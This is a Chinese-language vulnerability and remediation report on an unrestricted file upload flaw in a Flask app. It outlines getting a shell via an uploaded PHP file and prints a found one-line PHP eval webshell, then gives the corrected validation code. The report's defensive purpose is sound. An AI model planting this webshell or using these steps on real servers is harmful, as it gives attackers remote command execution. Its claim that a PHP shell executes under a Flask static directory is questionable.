# 文件上传漏洞发现与修复报告

## 漏洞概述

- **项目：** user-management（Flask 用户管理系统）
- **漏洞类型：** 无限制文件上传（Unrestricted File Upload）
- **风险等级：** 🔴 严重

## 漏洞详情

### 位置
`/upload` 路由（`app.py`）

### 问题代码（修复前）

```python
filename = os.path.basename(file.filename)
os.makedirs(UPLOAD_DIR, exist_ok=True)
save_path = os.path.join(UPLOAD_DIR, filename)
file.save(save_path)
```

- ❌ 未校验文件后缀名
- ❌ 未校验文件头魔数（magic bytes）
- ❌ 未重命名文件
- ❌ 错误信息暴露服务器路径

### 利用方式

攻击者可上传 PHP webshell 到 `static/uploads/` 目录，直接通过浏览器访问执行任意命令：

```
POST /upload → 上传 shell.php
访问 /static/uploads/shell.php → getshell
```

### 已确认的攻击痕迹

`static/uploads/1.php`（一句话木马，已删除）：
```php
<?php @eval($_POST['pass']); echo "yesssssss!"; ?>
```

## 修复措施

| 项目 | 修复内容 |
|------|---------|
| 后缀白名单 | 仅允许 `.png .jpg .jpeg .gif .webp` |
| 魔数校验 | 每种格式独立验证文件头（含 WebP 的 12 字节检测） |
| 文件重命名 | `uuid.uuid4().hex + ext`，防止路径穿越与名称猜测 |
| 错误信息 | 返回通用提示，不暴露路径 |

### 修复代码（`app.py`）

```python
UPLOAD_EXTENSIONS = {'.png', '.jpg', '.jpeg', '.gif', '.webp'}

def _validate_image(file_storage):
    filename = file_storage.filename
    ext = os.path.splitext(filename)[1].lower()
    if ext not in UPLOAD_EXTENSIONS:
        return False

    magic = file_storage.read(12)
    file_storage.seek(0)

    if ext == '.png' and magic[:8] == b'\x89PNG\r\n\x1a\n':
        return True
    if ext in ('.jpg', '.jpeg') and magic[:3] == b'\xff\xd8\xff':
        return True
    if ext == '.gif' and magic[:6] in (b'GIF87a', b'GIF89a'):
        return True
    if ext == '.webp' and magic[:4] == b'RIFF' and magic[8:12] == b'WEBP':
        return True
    return False
```

上传时校验通过后再重命名保存。

## 总结

修复后文件上传功能已具备后缀校验、魔数校验、文件重命名三层防护，可以有效防止 webshell 上传攻击。
